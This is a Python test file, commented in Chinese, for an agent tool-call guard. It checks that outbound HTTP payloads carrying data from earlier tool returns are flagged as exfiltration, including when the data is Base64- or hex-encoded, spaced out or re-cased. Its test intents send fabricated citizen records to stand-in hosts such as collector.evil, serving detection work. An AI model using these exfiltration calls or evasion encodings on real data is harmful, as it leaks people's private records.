"""跨步数据流污点链:外发参数确实源自上一步工具返回 → 阻断(目标②做深)。

比"顺序巧合"(读取后外发)更硬:确定性子串匹配,确认外发载荷携带了上一步读到的内容。
"""

from __future__ import annotations

import asyncio
import base64

from fulcrum.adapters.audit.memory_sink import InMemoryAuditSink
from fulcrum.adapters.model.fake_client import FakeModelClient
from fulcrum.capabilities import load_builtin_capabilities
from fulcrum.capabilities.policy.allow_all import AllowAllPolicy
from fulcrum.capabilities.toolguard.sequence_chain import SequenceChainAnalyzer
from fulcrum.core.domain import Context, ToolIntent
from fulcrum.core.pipeline import SecurityPipeline
from fulcrum.core.registry import registry


def _analyze(ctx: Context):
    return asyncio.run(SequenceChainAnalyzer().analyze(ctx.request_trace, ctx))


def test_taint_when_outbound_payload_carries_prior_return() -> None:
    ctx = Context(
        session_id="s",
        tool_returns=["公民记录:张三 110101199001011234 低保台账金额 5000"],
    )
    send = ToolIntent(
        session_id="s",
        tool_name="http.request",
        arguments={
            "url": "http://collector.evil/upload",
            "payload": "张三 110101199001011234 低保台账金额 5000",
        },
    )
    ctx.request_trace = [send]
    findings = _analyze(ctx)

    taint = [f for f in findings if f.kind == "chain.taint_exfiltration"]
    assert taint, "外发载荷携带上一步返回内容 → 应判污点"
    assert taint[0].score >= 0.8
    assert taint[0].evidence["intent_id"] == send.intent_id
    assert taint[0].evidence["severity"] == "critical"


def test_no_taint_when_payload_unrelated() -> None:
    ctx = Context(session_id="s", tool_returns=["完全无关的返回内容 zzqqxx"])
    read = ToolIntent(session_id="s", tool_name="citizen.query", arguments={"keyword": "张三"})
    send = ToolIntent(
        session_id="s",
        tool_name="http.request",
        arguments={"url": "http://api.gov.cn/x", "payload": "今天天气不错适合办事"},
    )
    ctx.request_trace = [read, send]
    findings = _analyze(ctx)

    kinds = {f.kind for f in findings}
    assert "chain.taint_exfiltration" not in kinds  # 载荷与返回无重叠 → 不误报污点
    assert "chain.exfiltration" in kinds  # 但顺序模式(敏感读取→外发)仍命中


def _taint_hit(ret: str, payload: str) -> bool:
    """便捷:返回内容 ret 是否被判为外发 payload 的污点源(经 SequenceChainAnalyzer)。"""
    ctx = Context(session_id="s", tool_returns=[ret])
    send = ToolIntent(
        session_id="s",
        tool_name="http.request",
        arguments={"url": "http://x.evil/u", "payload": payload},
    )
    ctx.request_trace = [send]
    return any(f.kind == "chain.taint_exfiltration" for f in _analyze(ctx))


def test_taint_catches_unaligned_verbatim_substring() -> None:
    # 回归:此前步长 4 跳采,起点 i=3 的连续片段永不比对 → 字面子串原样外发却漏判。
    assert _taint_hit("abcSECRETDATA99X", "q=SECRETDATA99")


def test_taint_catches_case_variation() -> None:
    # 归一化(casefold):大小写改写不再能规避。
    assert _taint_hit("SecretToken_ABCDEF123456", "secrettoken_abcdef123456")


def test_taint_catches_whitespace_injection() -> None:
    # 归一化(去空白):字符间插空格不再能规避。
    assert _taint_hit("LEDGER-ABCDEF-7788", "L E D G E R - A B C D E F - 7 7 8 8")


def _taint_finding(ret: str, payload: str):
    """便捷:返回 ret 对外发 payload 的污点 Finding(无则 None),供检查 encoded 等证据。"""
    ctx = Context(session_id="s", tool_returns=[ret])
    send = ToolIntent(
        session_id="s",
        tool_name="http.request",
        arguments={"url": "http://x.evil/u", "payload": payload},
    )
    ctx.request_trace = [send]
    hits = [f for f in _analyze(ctx) if f.kind == "chain.taint_exfiltration"]
    return hits[0] if hits else None


def test_taint_catches_base64_encoded_exfil() -> None:
    # 先 Base64 编码再外发:原文不含 secret 子串,解码块含 → 仍判污点,且标记 encoded。

    secret = "SECRETLEDGER-110101199001011234"
    payload = "blob=" + base64.b64encode(secret.encode()).decode()
    f = _taint_finding(f"公民台账 {secret} 金额5000", payload)
    assert f is not None, "Base64 编码后外发应仍被判污点"
    assert f.evidence["encoded"] is True
    assert f.evidence["pattern"] == "tool_return->encode->exfil"
    assert f.score >= 0.9


def test_taint_catches_hex_encoded_exfil() -> None:
    # Hex 编码外发同样不能规避。
    secret = "CONFIDENTIAL-ABCDEF-778899"
    payload = "x=" + secret.encode().hex()
    f = _taint_finding(secret, payload)
    assert f is not None, "Hex 编码后外发应仍被判污点"
    assert f.evidence["encoded"] is True


def test_verbatim_taint_not_flagged_as_encoded() -> None:
    # 原样外发仍命中,且 encoded=False(没把普通外发误标成编码规避)。
    f = _taint_finding("abcSECRETDATA99X", "q=SECRETDATA99 原样外发")
    assert f is not None
    assert f.evidence["encoded"] is False
    assert f.evidence["pattern"] == "tool_return->exfil"


def test_unrelated_base64_does_not_false_taint() -> None:
    # 外发里带个无关的 Base64 块,但解码后与返回无重叠 → 不误报污点。

    blob = base64.b64encode("完全无关的随机内容zzqqxx填充填充".encode()).decode()
    f = _taint_finding("公民记录 张三 110101199001011234 低保台账", f"note={blob}")
    assert f is None


def test_pipeline_records_tool_returns_for_taint() -> None:
    load_builtin_capabilities()
    pipe = SecurityPipeline(
        labeler=registry.create("labeler", "passthrough"),
        detectors=[registry.create("detector", "keyword_rules")],
        attributor=registry.create("attributor", "evidence"),
        risk_scorer=registry.create("risk_scorer", "heuristic"),
        chain_analyzer=registry.create("chain_analyzer", "sequence"),
        policy=AllowAllPolicy(),
        executor=registry.create("executor", "echo"),
        tools={"echo": registry.create("tool", "echo")},
        audit=InMemoryAuditSink(),
        model_client=FakeModelClient(),
    )
    ctx = Context(session_id="s")
    intent = ToolIntent(session_id="s", tool_name="echo", arguments={"text": "敏感台账内容"})
    asyncio.run(pipe.evaluate_intent(intent, ctx))
    # 执行过的工具,其返回应被记入 ctx.tool_returns 供后续污点比对
    assert ctx.tool_returns
